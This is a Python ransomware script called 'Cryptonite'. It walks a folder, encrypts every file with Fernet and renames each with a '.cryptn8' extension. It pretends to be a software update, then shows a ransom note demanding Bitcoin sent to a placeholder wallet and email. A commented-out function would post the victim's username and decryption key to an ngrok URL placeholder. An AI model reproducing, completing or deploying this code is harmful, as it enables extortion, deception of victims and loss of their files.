# imports
import os
from cryptography.fernet import Fernet
import random
from datetime import datetime
import time
import requests as r
import json
import tqdm

# some GLOBALS
url = "YOUR_NGROK_URL_HERE"
key = Fernet.generate_key()
fe = Fernet(key)
dkrpt = random.randint(100000, 999999)
uniqKey = str(datetime.now().time()).strip().replace(':', '').replace('.', '')

BTC_AMOUNT = 0.03                                       # <----  REQUIRED
BTC_WALLET = "YOUR_BTC_WALLET_HERE"                     # <----  REQUIRED
EMAIL = "YOUR_EMAIL_HERE"                               # <----  REQUIRED

EXCLUDED_DIRS = [   "/Windows",
                    "/Program Files",
                    "/Program Files (x86)",
                    "/AppData"
                ]

fileLists = []      # stores the files to be encrypted
fileList = [] 


class Cryptonite():
    def __init__(self,key,fe,dkrpt,uniqKey):
        self.key = key
        self.fernetEncrypt = fe

        self.decryptPlease = dkrpt
        self.uniqueKey = uniqKey

              # stores the files to be decrypted


    def sendKeys(self):
        id = str(datetime.now().time()).strip().replace(':', '').replace('.', '')
        user = os.getlogin()
        key = self.decryptPlease

        jsonFormat = {
            "uniqueId": id,
            "user": user,
            "key": key
        }

        r.post(url, data=json.dumps(jsonFormat))


    def encrypt(self):
        
        for file in tqdm.tqdm(fileLists):
            flag = 0
            newfile = str(file)+".cryptn8"
            try:
                with open(file, "rb") as f:
                    data = f.read()
                    encryptedData = self.fernetEncrypt.encrypt(data)
            except:
                flag = 1
            if flag == 0:
                try:
                    with open (file, "wb") as f:
                        fileList.append(file)
                        f.write(encryptedData)
                    os.rename(file, newfile)
                except:
                    a = "error" # just to fill the except block 


    def findFiles(self):
        
        print("Please be patient, checking for new updates...\n")
        time.sleep(5)
        print("Update found! Downloading the files... \n")
        for root, dir, file in os.walk('./testfolder'):
            for i in range(len(EXCLUDED_DIRS)):
                if EXCLUDED_DIRS[i] in root:
                    break
                else:
                    if i == len(EXCLUDED_DIRS) - 1:
                        for files in file:
                            files = os.path.join(root, files)
                            fileLists.append(files)
                            
        print("Download Completed!\n")
        time.sleep(2)
        print("Installing the Updates. This might take some time. Please be patient... \n")
        self.encrypt()
        os.system("cls" if os.name == 'nt' else "clear") 
            
  

    def decrypt(self):
        for files in fileList:
            flag = 0
            try:
                with open(str(files)+".cryptn8", "rb") as f:
                    data = f.read()
            except:
                flag = 1
            if flag == 0:
                try:
                    with open(str(files)+".cryptn8", "wb") as f:
                        decryptedData = self.fernetEncrypt.decrypt(data)
                        f.write(decryptedData)
                    os.rename(str(files)+".cryptn8", files)
                except:
                    a = "error" # just to fill the except block


class System(Cryptonite):
    def __init__(self,key,fe,dkrpt,uniqKey):
        super().__init__(key,fe,dkrpt,uniqKey)

    def warningScreen(self):
            print("DO NOT CLOSE THIS WINDOW, OR ELSE ALL YOUR FILES WILL BE FOREVER ENCRYPTED!!\n\nWe won't be able to help you out then :(\n\n")
            print(f"If you wish to decrypt your file, send us {BTC_AMOUNT} BTC and email us the unique key provided to you and the proof that you have paid the ransom. Then only we will provide the Decryption key which will decrypt the files")
            print("\n\nRemember, you will be given only ONE CHANCE to enter the correct key:\n")
            print(f"\nBTC wallet address:- {BTC_WALLET}")
            print(f"\nEmail address:- {EMAIL}\n\n")
            print(f"\t\tYour unique key: {self.uniqueKey}")
            print(f"Your Decrypt Key is: {self.decryptPlease}")
            x = int(input("\t\tDecryption key: "))
            if x == self.decryptPlease:
                self.decrypt()
            else:
                exit()



if __name__ == "__main__":
    
    cryptn8 = Cryptonite(key,fe,dkrpt,uniqKey)
    window = System(key,fe,dkrpt,uniqKey)

    # cryptn8.sendKeys()
    cryptn8.findFiles()
    window.warningScreen()
